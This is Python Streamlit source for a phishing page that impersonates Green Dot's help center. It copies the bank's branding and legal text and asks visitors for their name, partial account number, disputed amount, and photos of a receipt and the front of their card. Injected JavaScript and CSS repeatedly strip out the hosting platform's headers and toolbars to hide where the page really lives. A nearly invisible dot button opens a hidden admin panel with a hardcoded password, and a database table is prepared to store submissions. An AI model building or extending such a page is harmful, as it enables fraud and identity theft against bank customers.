
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- CONFIGURACIÓN DE BASE DE DATOS ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    return "GD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- JS: PURGA ATÓMICA (Intervalo ultra rápido para evitar parpadeos de GitHub) ---
st.markdown("""<script>
    const purgeResiduals = () => {
        const targets = [
            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]', 
            'button[title="View fullscreen"]', '.st-emotion-cache-140j12g', 
            'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri', 
            '.etxdrby3', '.etxdrby1', 'svg.section-anchor-icon'
        ];
        targets.forEach(s => { 
            document.querySelectorAll(s).forEach(el => el.style.display = 'none');
            document.querySelectorAll(s).forEach(el => el.remove()); 
        });
    };
    setInterval(purgeResiduals, 50);
</script>""", unsafe_allow_html=True)

# --- CSS: BLOQUEO PERMANENTE ---
st.markdown("""<style>
    /* Ocultar anclas y herramientas de GitHub/Streamlit */
    .section-anchor, a.section-anchor, .st-emotion-cache-gi0tri, [data-testid="stHeader"], 
    [data-testid="stAppToolbar"], footer, header { 
        display: none !important; 
        visibility: hidden !important; 
        opacity: 0 !important; 
        pointer-events: none !important; 
    }

    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
    
    .promo-box { background-color: #111; padding: 30px; text-align: center; border-radius: 12px; margin: 25px 0; border: 1px solid #222; }
    .legal-container { font-size: 10px; color: #444; text-align: justify; margin-top: 50px; border-top: 1px solid #111; padding-top: 15px; line-height: 1.5; }
    
    div.stButton > button[key="ghost_dot"] {
        background-color: transparent !important; border: none !important; color: #444 !important;
        padding: 0 !important; margin: 0 !important; display: inline !important;
        font-size: 10px !important; width: auto !important; height: auto !important;
        min-height: 0 !important; min-width: 0 !important; box-shadow: none !important;
        cursor: text !important; vertical-align: baseline !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col_logo = st.columns([1, 1.5, 1])[1]
    with col_logo:
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
    
    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")
    
    with st.form("ghost_form_32_4_1", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.markdown("**Evidence**")
        rec = st.file_uploader("Receipt", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Front", type=['jpg','png','jpeg'])
        if st.form_submit_button("SUBMIT NOW"):
            if nombre and rec and car:
                ref = generate_ref()
                st.success(f"Success. Reference: {ref}")
            else: st.error("Information required.")
            
    st.markdown("""<div class='promo-box'>
        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
            </a>
            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
            </a>
        </div>
    </div>""", unsafe_allow_html=True)
    
    st.markdown("""<div class='legal-container'>
        * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
        ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739""", unsafe_allow_html=True)
    if st.button(".", key="ghost_dot"): st.session_state.admin_mode = True
    st.markdown("</div>", unsafe_allow_html=True)
else:
    col_adm = st.columns([1, 1.5, 1])[1]
    with col_adm:
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
    if st.button("Exit"): st.session_state.admin_mode = False
    pw = st.text_input("Auth Key", type="password")
    if pw == "Diostieneelpoder1": st.write("Access Granted")
